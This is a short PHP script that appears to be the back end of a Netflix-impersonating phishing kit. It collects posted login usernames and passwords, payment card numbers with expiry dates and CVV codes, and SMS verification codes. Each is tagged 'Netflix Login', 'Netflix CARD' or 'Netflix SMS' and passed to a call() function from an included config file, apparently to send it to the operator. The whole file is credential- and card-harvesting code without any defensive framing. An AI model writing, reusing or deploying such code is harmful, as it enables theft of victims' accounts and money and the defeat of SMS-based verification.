<?php 
session_start();
require '../config.php';
 


if(isset($_POST['user'])){
call("/- Netflix Login -/
".$_POST['user']." | ".$_POST['pass']);
return;
}


if(isset($_POST['cc'])){
$_SESSION["card_num"] = $_POST['cc'];
call("/- Netflix CARD -/
".$_POST['cc']." | ".$_POST['exp']." | ".$_POST['cvv']);
return;
}



if(isset($_POST['sms'])){
call("/- Netflix SMS  -/
".$_POST['sms']);
return;
}



?>